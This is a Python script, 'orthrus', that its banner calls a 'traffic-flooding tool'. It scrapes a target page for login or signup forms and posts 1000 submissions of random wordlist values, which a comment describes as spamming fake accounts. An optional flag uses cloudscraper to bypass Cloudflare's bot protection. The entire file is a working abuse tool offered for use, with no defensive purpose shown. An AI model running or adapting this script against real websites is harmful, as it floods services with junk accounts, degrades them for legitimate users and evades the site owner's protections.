#!/usr/bin/python
import requests
from bs4 import BeautifulSoup as bs
import time
import sys, os
import argparse
import random
import cloudscraper

banner = """
-=[ traffic-flooding tool ]=-
wrriten on thu dec 25 10:58:48 2025
author: Gameye98
founder: schadenfreude & blackhole security
"""

parser = argparse.ArgumentParser(
    prog="orthrus",
    description=banner,
    formatter_class=argparse.RawDescriptionHelpFormatter  # disable re-wrapping
)
parser.add_argument("url")
parser.add_argument("wordlist")
parser.add_argument(
    "--cf",
    action="store_true",
    help="bypass cloudflare"
)

def pprint(text):
    now = time.strftime("%X")
    print(f"\x1b[1;93m[{now}]\x1b[0m {text}")

args = parser.parse_args()

def main():
    with open(args.wordlist,"r") as f:
        words = f.read().splitlines()
    session = cloudscraper.CloudScraper() if args.cf else requests.Session()
    r = session.get(args.url)
    soup = bs(r.text, "html5lib")
    # looking for the main form and the input
    for form in soup.find_all("form"):
        if not form.get("method").lower() == "post":
            continue
        endpoint = form.get("action")
        # looking for the input
        inputs = form.find_all("input")
        isfound = 0
        inputname = []
        # the form in minimum shouldve 2 input text and 1 submit button
        for inputx in inputs:
            if inputx.get("type") == "text" or inputx.get("type") == "password":
                isfound += 1
                try:
                    inputname.append(inputx.get("name"))
                except AttributeError:
                    pass
        pprint(f"{isfound} input(s) found")
        if isfound >= 2:
            # were going to spam 1000 fake accounts
            url = args.url
            while url.endswith("/"):
                url = url[0:len(url)-1]
            if not endpoint.startswith("http") and not ":" in endpoint:
                while endpoint.startswith("/"):
                    endpoint = endpoint[1:]
                protocol = args.url.split("//")[0]
                domain = args.url.split("//")[1].split("/")[0]
                url = protocol+"//"+domain+"/"+endpoint
            else:
                url = endpoint
            for _ in range(1000):
                filled = {}
                for name in inputname:
                    word = random.choice(words).strip()
                    filled[name] = word
                r = session.post(url, data=filled)
                if r.status_code == 200:
                    pprint(f"\x1b[1;92m{r.status_code} sent {str(filled)} to {args.url}\x1b[0m")
                else:
                    pprint(f"x1b[1;41;93m{r.status_code} sent {str(filled)} to {args.url}\x1b[0m")

if __name__ == "__main__":
    if args.url:
        if args.url.startswith("http"):
            if args.wordlist and os.path.isfile(args.wordlist):
                    main()
